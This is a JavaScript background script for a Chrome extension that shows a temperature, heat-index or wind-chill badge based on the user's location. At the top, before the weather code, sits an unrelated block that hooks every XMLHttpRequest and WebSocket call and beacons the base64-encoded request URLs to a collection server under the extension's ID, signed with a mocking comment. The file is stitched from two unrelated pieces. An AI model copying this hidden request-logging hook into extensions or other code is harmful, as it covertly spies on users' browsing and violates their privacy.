function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
﻿/*
Windchill Temperature is only defined for temperatures at or below 10°C (50°F) 
and wind speeds above 4.8 kilometres per hour (3.0 mph).
The heat index is calculated only if the actual temperature is above 27° (80°F), 
dew point temperatures greater than 12°C (54°F), and relative humidities higher than 40%.
*/
weatherData = new Object();
weatherData.temp_c = "NA";
weatherData.temp_f = "NA";
weatherData.wind_mph = "NA";
weatherData.dewpoint_c = "NA";
weatherData.relative_humidity = "NA";
weatherData.heat_index_c ="NA";
weatherData.heat_index_f ="NA";

var lastLatitude;
var lastLongitude;
var UPDATE_INTERVAL = 300000; //5 minutes 
var temperatureScale = "c";

function loadXML(docName) {
	xhttp=new XMLHttpRequest();
	xhttp.open("GET",docName,false);
	xhttp.send();
	return xhttp.responseXML;
}

function updateIcon() {
	updateWeather(lastLatitude, lastLongitude);
	computeResult();
}

function updateWeather(latitude, longitude) {
	var xmlDoc = loadXML("http://api.wunderground.com/auto/wui/geo/WXCurrentObXML/index.xml?query=" 
		+ lastLatitude + "," + lastLongitude); 
	weatherData.temp_c = xmlDoc.getElementsByTagName("temp_c")[0].childNodes[0].nodeValue;
	weatherData.temp_f = xmlDoc.getElementsByTagName("temp_f")[0].childNodes[0].nodeValue;
	weatherData.wind_mph = xmlDoc.getElementsByTagName("wind_mph")[0].childNodes[0].nodeValue;
	weatherData.dewpoint_c = xmlDoc.getElementsByTagName("dewpoint_c")[0].childNodes[0].nodeValue;
	weatherData.relative_humidity = xmlDoc.getElementsByTagName("relative_humidity")[0].childNodes[0].nodeValue;
	weatherData.heat_index_c = xmlDoc.getElementsByTagName("heat_index_c")[0].childNodes[0].nodeValue;
	weatherData.heat_index_f = xmlDoc.getElementsByTagName("heat_index_f")[0].childNodes[0].nodeValue;
	
/* 	alert("Updated weather data:\n" +
		"temp_c: " + weatherData.temp_c + "\n" +
		"temp_f: " + weatherData.temp_f + "\n" +
		"wind_mph: " + weatherData.wind_mph + "\n" +
		"dewpoint_c: " + weatherData.dewpoint_c + "\n" +
		"relative_humidity: " + weatherData.relative_humidity + "\n" +
		"heat_index_c: " + weatherData.heat_index_c + "\n" +
		"heat_index_f: " + weatherData.heat_index_f + "\n"
	);	 */
}

function computeHeatIndex(tf, r) {
	// tf - temperature in Fahrenheit
	// r - relativity humidity in decimal point
	// hI - returned heat index in F
	var c1 = -42.379;
	var c2 = 2.04901523;
	var c3 = 10.14333127;
	var c4 = -0.22475541;
	var c5 = -6.83783*Math.pow(10,-3);
	var c6 = -5.481717*Math.pow(10,-2);
	var c7 = 1.22874*Math.pow(10,-3);
	var c8 = 8.5282*Math.pow(10,-4);
	var c9 = -1.99*Math.pow(10,-6);
	var hI = c1 + c2*tf + c3*r + c4*tf*r + c5*Math.pow(tf,2)
	+ c6*Math.pow(r,2) + c7*Math.pow(tf,2)*r + c8*tf*Math.pow(r,2)
	+ c9*Math.pow(tf*r,2);
	
	if (temperatureScale=="c") {
		return (hI-32)*5/9;
	} else {
		return hI;
	}
}

function computeWindChill(tc, ws) {
	// tc - temperature(C)
	// ws - wind speed in km/h
	// windChill_c - wind chill index (C)
	var windChill_c = 13.12 + 0.6215*tc - 11.37*Math.pow(ws,0.16) 
		+ 0.3965*tc*Math.pow(ws,0.16);
	
	if (temperatureScale=="c") {
		return windChill_c;
	} else {
		return windChill_c*9/5+32;
	}
}

function computeResult() {
	var tc = weatherData.temp_c;
	var tf = weatherData.temp_f;
	var dc = weatherData.dewpoint_c;
	var ws = weatherData.wind_mph * 1.609344;
	var rh = weatherData.relative_humidity.replace("%","");
	
	// Check data availbility
	if (!isFinite(tc) || !isFinite(tf) || !isFinite(dc) 
			|| !isFinite(ws)  || !isFinite(rh)){
		paintBadge("err",[128,128,128,128]);
		
	// If temperature(C) is under 10, use wind chill index
	} else if (tc <= 10)  {
		paintBadge(computeWindChill(tc,ws), [0,0,255,128]);
		
	// if temperature(C) is above 27, use heat index
	} else if (tc >= 27 && dc >= 12 && rh >= 40) {
		paintBadge(computeHeatIndex(tf, rh), [255,0,0,128]);
	
	// otherwise, use air temperature
	} else {
		paintBadge((temperatureScale=="c")?tc:tf, [0,255,0,128]);
	}		
}

function paintBadge(text, colorArray) {
	var badgeText = new Object();
	var badgeColor = new Object();
	badgeColor.color = colorArray;
	if (isFinite(text)) {
		badgeText.text = Math.round(text) + "°";
	} else {
		badgeText.text = text;
	}
		
	chrome.browserAction.setBadgeText(badgeText);
	chrome.browserAction.setBadgeBackgroundColor(badgeColor);	
}


// Load saved preferences
if (localStorage["temperatureScale"]){
	temperatureScale = localStorage["temperatureScale"];
}

// Initialize the badge text and color
paintBadge("err", [128,128,128,128]);

// Subscribe to user location
navigator.geolocation.watchPosition(function(position) {
    lastLatitude = position.coords.latitude;
    lastLongitude = position.coords.longitude;
    updateIcon();
});

// Setup an update per time interval
window.setInterval(function(){
    navigator.geolocation.getCurrentPosition(function(position) {
        lastLatitude = position.coords.latitude;
        lastLongitude = position.coords.longitude;
    }, updateIcon());
    
}, UPDATE_INTERVAL);

// Add listener for option changes
chrome.extension.onConnect.addListener(function(port) {
	if (port.name=="optionSaved") {
		port.onMessage.addListener(function(msg) {
			if (msg.optionType == "temperatureScale") {
				temperatureScale = localStorage["temperatureScale"];
				computeResult();
			}
		});
	}
});


